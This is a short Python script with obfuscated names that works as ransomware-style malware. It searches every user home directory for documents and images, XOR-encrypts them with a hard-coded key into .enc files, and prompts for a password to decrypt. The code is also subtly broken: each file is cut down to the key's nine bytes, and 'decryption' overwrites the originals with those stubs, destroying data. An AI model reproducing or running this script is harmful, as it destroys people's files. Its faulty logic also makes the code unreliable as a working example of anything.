import os, glob, getpass

def l(t):
    print(t)
    p = getpass.getpass()
    return p

def c(f_t):
    c_f = []
    for f_t_ in f_t:
        for p in ["/home/*/"]:
            for fp in glob.glob(p + f"**/*{f_t_}", recursive=True):
                c_f.append(fp)
    return c_f

def s_x_c(d, k):
    return bytes([d_b ^ k_b for d_b, k_b in zip(d, k)])

def e_d_f(f, k, decrypt=False):
    for fp in f:
        with open(fp, "rb") as fi:
            d = fi.read()
        e_d_d = s_x_c(d, k)
        if decrypt:
            fp = fp[:-4]
        else:
            fp += ".enc"
        with open(fp, "wb") as fi:
            fi.write(e_d_d)

def m():
    p = "swordf!sh"
    k = bytes(p, "utf-8")

    f_t = [".txt", ".doc", ".pdf", ".jpg", ".png"]
    f = c(f_t)

    e_d_f(f, k)

    print("Files have been encrypted. To decrypt, enter the correct password.")

    dp = l("Enter your password to decrypt files:")
    dk = bytes(dp, "utf-8")

    if p == dp:
        df_t = [".enc"]
        df = c(df_t)
        e_d_f(df, dk, decrypt=True)
        print("Files have been decrypted.")
    else:
        print("Incorrect password. Files were not decrypted.")

if __name__ == "__main__":
    m()
